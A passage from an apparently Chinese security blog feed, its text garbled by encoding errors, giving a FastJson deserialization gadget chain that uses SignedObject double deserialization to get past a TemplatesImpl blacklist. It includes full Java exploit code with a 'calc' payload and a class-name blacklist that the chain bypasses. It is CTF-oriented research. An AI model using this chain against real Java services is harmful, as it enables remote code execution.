        <content type="html"><![CDATA[<h2 id="FastJsonç»“åˆäºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡é»‘åå•"><a href="#FastJsonç»“åˆäºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡é»‘åå•" class="headerlink" title="FastJsonç»“åˆäºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡é»‘åå•"></a>FastJsonç»“åˆäºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡é»‘åå•</h2><blockquote><p>æœ¬æ–‡é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºã€‚</p></blockquote><h4 id="çœæµ"><a href="#çœæµ" class="headerlink" title="çœæµ"></a>çœæµ</h4><p>è¯¥åˆ©ç”¨é“¾å¯ä»¥åœ¨<code>fastjson</code>ä»»æ„ç‰ˆæœ¬å®ç°<code>RCE</code>ï¼Œå¹¶ä¸”å€ŸåŠ©<code>SignedObject</code>ç»•è¿‡ç¬¬ä¸€å±‚å®‰å…¨çš„<code>resolveClass</code>å¯¹äº<code>TemplatesImpl</code>ç±»çš„æ£€æŸ¥ã€‚</p><p>æ¡ä»¶å¦‚ä¸‹ï¼š</p><ol><li><code>ObjectInputStream</code>ï¼ˆååºåˆ—åŒ–ï¼‰è¾“å…¥æ•°æ®å¯æ§</li><li>å¼•å…¥<code>Fastjson</code>ä¾èµ–</li></ol><h4 id="FastJsonä¹‹ä¸å®‰å…¨çš„ååºåˆ—åŒ–åˆ©ç”¨"><a href="#FastJsonä¹‹ä¸å®‰å…¨çš„ååºåˆ—åŒ–åˆ©ç”¨" class="headerlink" title="FastJsonä¹‹ä¸å®‰å…¨çš„ååºåˆ—åŒ–åˆ©ç”¨"></a>FastJsonä¹‹ä¸å®‰å…¨çš„ååºåˆ—åŒ–åˆ©ç”¨</h4><p>è¯´èµ·æ¥è¿˜æ˜¯<code>AliyunCTF</code>é‚£é“<code>ezbean</code>çš„éé¢„æœŸï¼Œå¾ˆå¤šå¸ˆå‚…ä½¿ç”¨<code>FastJson#toString</code>æ–¹æ³•è§¦å‘<code>TemplatesImpl#getOutputProperties</code>å®ç°<code>RCE</code>ã€‚</p><p><strong>gadget</strong></p><pre><code>BadAttributeValueExpException#readObjectJSONArray#toStringTemplatesImpl#getOutputProperties</code></pre><p><code>FastJson</code>ååºåˆ—åŒ–å¹¶ä¸æ˜¯é€šè¿‡<code>ObjectInputStream.readObject()</code>è¿˜åŸå¯¹è±¡ï¼Œè€Œæ˜¯åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è‡ªåŠ¨è°ƒç”¨ç±»å±æ€§çš„<code>setter/getter</code>æ–¹æ³•ï¼Œå°†<code>JSON</code>å­—ç¬¦ä¸²è¿˜åŸæˆå¯¹è±¡ã€‚</p><p>å› æ­¤ä»<code>FJ 1.2.49</code>å¼€å§‹ï¼Œ<code>JSONArray</code>å’Œ<code>JSONObject</code>å¼€å§‹é‡å†™äº†<code>resolveClass</code>ï¼Œè¿‡æ»¤äº†è¯¸å¦‚<code>TemplatesImpl</code>çš„å±é™©ç±»ã€‚è€Œ<code>ezbean</code>é‚£é“é¢˜ä½¿ç”¨äº†ä¸€ä¸ªä¸å®‰å…¨çš„<code>ObjectInputStream</code>è¿›è¡Œååºåˆ—åŒ–ã€‚</p><p>è¿™ä¹Ÿå°±å¯¼è‡´äº†é€‰æ‰‹é€šè¿‡å¼•ç”¨çš„æ•°æ®ç±»å‹ä»è€Œä¸æ‰§è¡Œ<code>resolveClass</code>ä»¥ç»•è¿‡å…¶å¯¹å±é™©ç±»çš„æ£€æŸ¥ï¼Œå¯¼è‡´äº†éé¢„æœŸã€‚</p><p><strong>exp</strong></p><pre class="line-numbers language-java"><code class="language-java">        List<span class="token operator">&lt;</span>Object<span class="token operator">></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TemplatesImpl templates <span class="token operator">=</span> GadgetUtils<span class="token punctuation">.</span><span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//ç¬¬ä¸€æ¬¡æ·»åŠ ä¸ºäº†ä½¿å¾—templateså˜æˆå¼•ç”¨ç±»å‹ä»è€Œç»•è¿‡JsonArrayçš„resolveClassé»‘åå•æ£€æµ‹</span>        JSONArray jsonArray <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        jsonArray<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//æ­¤æ—¶åœ¨hashè¡¨ä¸­æŸ¥åˆ°äº†æ˜ å°„ï¼Œå› æ­¤æ¥ä¸‹æ¥ä»¥å¼•ç”¨å½¢å¼è¾“å‡º</span>        BadAttributeValueExpException bd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        ReflectionUtils<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>bd<span class="token punctuation">,</span><span class="token string">"val"</span><span class="token punctuation">,</span>jsonArray<span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>bd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//å­—èŠ‚</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> payload <span class="token operator">=</span> SerializerUtils<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h4><p>ä¼¼ä¹è¿™æ ·çš„æ–¹å¼åªèƒ½åœ¨ç›®æ ‡ç¯å¢ƒä½¿ç”¨äº†ä¸€ä¸ªä¸å®‰å…¨çš„<code>ObjectInputStream</code>çš„åœºæ™¯ä¸‹åº”ç”¨ã€‚</p><p>å› ä¸º<code>templates</code>æ˜¯ä»¥å¼•ç”¨çš„å½¢å¼æ¥ç»•è¿‡<code>FJ</code>çš„<code>resolveClass</code>æ–¹æ³•çš„é»‘åå•æ£€æŸ¥ï¼Œå› æ­¤åœ¨ï¼ˆè§<code>exp</code>ç¬¬ä¸‰è¡Œï¼‰å¿…é¡»æŠŠ<code>templates</code>æ·»åŠ åˆ°<code>list</code>ä¸­ï¼Œæ‰€ä»¥å¦‚æœé‡å†™äº†<code>ObjectInputStream</code>è¿‡æ»¤<code>templates</code>ï¼Œè¿™æ ·çš„æ–¹æ³•å°±å¤±æ•ˆäº†ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyInputStream</span> <span class="token keyword">extends</span> <span class="token class-name">ObjectInputStream</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> List<span class="token operator">&lt;</span>Object<span class="token operator">></span> BLACKLIST <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">,</span> <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter"</span><span class="token punctuation">,</span> <span class="token string">"com.sun.syndication.feed.impl.ObjectBean"</span><span class="token punctuation">,</span> <span class="token string">"import com.sun.syndication.feed.impl.ToStringBean"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">MyInputStream</span><span class="token punctuation">(</span>InputStream inputStream<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">resolveClass</span><span class="token punctuation">(</span>ObjectStreamClass cls<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>BLACKLIST<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"The class "</span> <span class="token operator">+</span> cls<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" is on the blacklist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è§£å†³æ–¹æ¡ˆä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯é€šè¿‡äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡ã€‚</p><h4 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h4><p>ç®€å•ä»‹ç»ä¸‹<code>SignedObject</code>ï¼Œæ‘˜å½•è‡ª<a href="https://tttang.com/archive/1701/#toc_equalsbean">Poriaå¸ˆå‚…åšå®¢</a></p><p>å½“é˜²å¾¡è€…é‡å†™äº†<code>ObjectInputStream</code>ç±»ï¼Œå¹¶ä¸”å†<code>resolveClass</code>æ–¹æ³•å®šä¹‰äº†ååºåˆ—åŒ–é»‘åå•ç±»æ—¶ï¼Œæ­¤æ—¶å°±éœ€è¦é€šè¿‡äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡ã€‚</p><p>é¡¾åæ€ä¹‰ï¼Œ<strong>äºŒæ¬¡ååºåˆ—åŒ–æ”»å‡»å°±æ˜¯åœ¨å—å®³æœåŠ¡å™¨è¿›è¡Œç¬¬ä¸€æ¬¡ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å€ŸåŠ©æŸäº›ç±»çš„æ–¹æ³•è¿›è¡Œç¬¬äºŒæ¬¡ååºåˆ—åŒ–ã€‚</strong>è€Œç¬¬äºŒæ¬¡ååºåˆ—åŒ–æ˜¯æ²¡æœ‰<code>ban</code>æ¶æ„ç±»çš„ï¼Œé€šè¿‡è¿™ç§æ–¹æ³•é—´æ¥çš„å®ç°<code>bypass</code>é»‘åå•ã€‚</p><p>é˜…è¯»è¯¥ç±»æ³¨é‡Šå¯çŸ¥è¿™ä¸ªç±»å¯ä»¥å­˜æ”¾ä¸€ä¸ªåºåˆ—åŒ–æ•°æ®å¹¶ä¸”æœ‰ä¸€ä¸ªå±äºè¯¥æ•°æ®çš„ç­¾åã€‚</p><pre><code>More specifically, a SignedObject contains another Serializable object, the (to-be-)signed object and its signature.</code></pre><p>å†è§‚å¯Ÿ<code>getObject</code>æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä¸­è¿›è¡Œäº†ä¸€æ¬¡ååºåˆ—åŒ–ï¼Œè¿™å®Œç¾ç¬¦åˆäº†æˆ‘ä»¬çš„è¦æ±‚ï¼Œå¹¶ä¸”è¯¥ç±»æ˜¯<code>jdk</code>å†…ç½®ç±»ã€‚</p><p>äº‹å®ä¸Šï¼Œè¯¥ç±»ä¸»è¦ç”¨äºåŠ å¯†ååºåˆ—åŒ–æ•°æ®ï¼Œé˜²æ­¢æ”»å‡»è€…æˆªè·æ•°æ®åŒ…ä»è€Œè§£æåºåˆ—åŒ–æ•°æ®ï¼ˆç«Ÿç„¶æœ‰äº›è®½åˆºï¼‰ã€‚</p><pre class="line-numbers language-java"><code class="language-java">  <span class="token comment" spellcheck="true">/**     * Retrieves the encapsulated object.     * The encapsulated object is de-serialized before it is returned.     *     * @return the encapsulated object.     *     * @exception IOException if an error occurs during de-serialization     * @exception ClassNotFoundException if an error occurs during     * de-serialization     */</span>    <span class="token keyword">public</span> Object <span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// creating a stream pipe-line, from b to a</span>        ByteArrayInputStream b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInput a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object obj <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        b<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> obj<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è€Œè¦ååºåˆ—åŒ–çš„<code>this.content</code>å¯ä»¥é€šè¿‡æ„é€ æ–¹æ³•èµ‹å€¼ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•æ˜¯ä¸€ä¸ªç›¸å¯¹å®¹æ˜“è§¦å‘çš„<code>getter</code>æ–¹æ³•ï¼Œæ‰€ä»¥<strong>é—®é¢˜è½¬åŒ–ä¸ºäº†å¦‚ä½•è§¦å‘SignedObject#getObjectã€‚</strong></p><h4 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h4><p>æœ€å¥½æ‰¾åªä¾èµ–äº<code>FastJson</code>çš„åŒ…çš„<code>gadget</code>ï¼Œä½¿å¾—æ”»å‡»é¢æœ€å¤§ã€‚</p><p>è€Œæ­£å¥½<code>JsonObject#toString</code>å¯ä»¥è§¦å‘ä»»æ„<code>getter</code>æ–¹æ³•ï¼Œè€Œ<code>toString</code>åˆå¯ä»¥é€šè¿‡<code>BadAttributeValueExpException#readObject</code>è°ƒç”¨ï¼Œå› æ­¤æ•´æ¡é“¾å­å°±é€šäº†ã€‚</p><p><strong>gadget</strong></p><pre><code>* ç»•è¿‡ç¬¬ä¸€æ¬¡çš„TemplatesImplé»‘åå•æ£€æŸ¥    BadAttributeValueExpException#readObject    JSONOBJECT#toString    SignedObject#getObject* äºŒæ¬¡ååºåˆ—åŒ–    * å¼•ç”¨ç»•è¿‡JSONè‡ªå¸¦resolveClassçš„é»‘åå•æ£€æŸ¥        BadAttributeValueExpException#readObject        JSONArray#toString        TemplatesImpl#getOutputProperties            TemplatesImpl#newTransformer            TemplatesImpl#getTransletInstance            TemplatesImpl#defineTransletClasses            TemplatesImpl#defineClass</code></pre><p><strong>exp</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> gadget<span class="token punctuation">.</span>fastjson<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSONArray<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> gadget<span class="token punctuation">.</span>doubleunser<span class="token punctuation">.</span>MyInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> util<span class="token punctuation">.</span>GadgetUtils<span class="token punctuation">;</span><span class="token keyword">import</span> util<span class="token punctuation">.</span>ReflectionUtils<span class="token punctuation">;</span><span class="token keyword">import</span> util<span class="token punctuation">.</span>SerializerUtils<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ByteArrayInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>KeyPair<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>KeyPairGenerator<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>Signature<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>SignedObject<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ArrayList<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FJ2</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        List<span class="token operator">&lt;</span>Object<span class="token operator">></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TemplatesImpl templates <span class="token operator">=</span> GadgetUtils<span class="token punctuation">.</span><span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//ç¬¬ä¸€æ¬¡æ·»åŠ ä¸ºäº†ä½¿å¾—templateså˜æˆå¼•ç”¨ç±»å‹ä»è€Œç»•è¿‡JsonArrayçš„resolveClassé»‘åå•æ£€æµ‹</span>        JSONArray jsonArray2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        jsonArray2<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//æ­¤æ—¶åœ¨handlesè¿™ä¸ªhashè¡¨ä¸­æŸ¥åˆ°äº†æ˜ å°„ï¼Œåç»­åˆ™ä¼šä»¥å¼•ç”¨å½¢å¼è¾“å‡º</span>        BadAttributeValueExpException bd2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        ReflectionUtils<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>bd2<span class="token punctuation">,</span><span class="token string">"val"</span><span class="token punctuation">,</span>jsonArray2<span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>bd2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//äºŒæ¬¡ååºåˆ—åŒ–</span>        KeyPairGenerator kpg <span class="token operator">=</span> KeyPairGenerator<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        kpg<span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        KeyPair kp <span class="token operator">=</span> kpg<span class="token punctuation">.</span><span class="token function">generateKeyPair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        SignedObject signedObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SignedObject</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Serializable<span class="token punctuation">)</span> list<span class="token punctuation">,</span> kp<span class="token punctuation">.</span><span class="token function">getPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Signature<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//è§¦å‘SignedObject#getObject</span>        JSONArray jsonArray1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        jsonArray1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>signedObject<span class="token punctuation">)</span><span class="token punctuation">;</span>        BadAttributeValueExpException bd1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        ReflectionUtils<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>bd1<span class="token punctuation">,</span><span class="token string">"val"</span><span class="token punctuation">,</span>jsonArray1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//éªŒè¯</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> payload <span class="token operator">=</span> SerializerUtils<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>bd1<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//å†å¥—ä¸€å±‚inputstreamæ£€æŸ¥TemplatesImplï¼Œä¸å¯ç”¨</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h4><p>è°ƒè¯•éƒ¨åˆ†å¯è§å…ˆçŸ¥ç¤¾åŒºï¼Œ<code>toString</code>è§¦å‘<code>getter</code>é‚£é‡Œè¿˜æ˜¯æ²¡å¤ªè°ƒè¯•æ˜ç™½ï¼Œåˆ°æ—¶å€™æŠŠ<code>fastjson</code>æ•´ç†å®Œå‘åˆ°å¦ä¸€ç¯‡åšå®¢ä¸Šã€‚</p><h4 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h4><p><code>fastjson</code>çš„åˆ©ç”¨å¾€å¾€é€šè¿‡<code>parseObject</code>è§¦å‘ååºåˆ—åŒ–ï¼Œæ­¤æ¬¡æ¢ç´¢æ˜¯åœ¨<code>readObject</code>ååºåˆ—åŒ–åœºæ™¯ä¸‹è¿›è¡Œã€‚çœŸå®åœºæ™¯ä¸‹ä¸å¤ªäº†è§£ï¼Œemmå¯èƒ½åœ¨<code>ctf</code>ä¸­å¯ä»¥é€šè¿‡è¿™æ¡é“¾å­æ‰“ä¸ªéé¢„æœŸå§ã€‚</p><p>ç”±äºç¬”è€…æ°´å¹³ä¸é«˜ï¼Œå¸Œæœ›å¸ˆå‚…ä»¬å¤šå¤šæŒ‡æ­£ã€‚</p><h4 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h4><ol><li><a href="https://tttang.com/archive/1701/#toc_equalsbean">äºŒæ¬¡ååºåˆ—åŒ– çœ‹æˆ‘ä¸€å‘½é€šå…³-Ploria</a></li><li><a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">FastJsonä¸åŸç”Ÿååºåˆ—åŒ–(äºŒ)-Y4tacker</a></li><li><a href="https://xz.aliyun.com/t/12485">AliyunCTFå®˜æ–¹writeup-f1yyy</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç ”ç©¶ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javaå®‰å…¨ </tag>
            
            <tag> FastJson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ³¨å…¥ç©¶æä¹‹æ€»ç»“</title>
      <link href="/2023/05/15/sql-zhu-ru-zong-jie-mei-xie-wan/"/>
      <url>/2023/05/15/sql-zhu-ru-zong-jie-mei-xie-wan/</url>
      
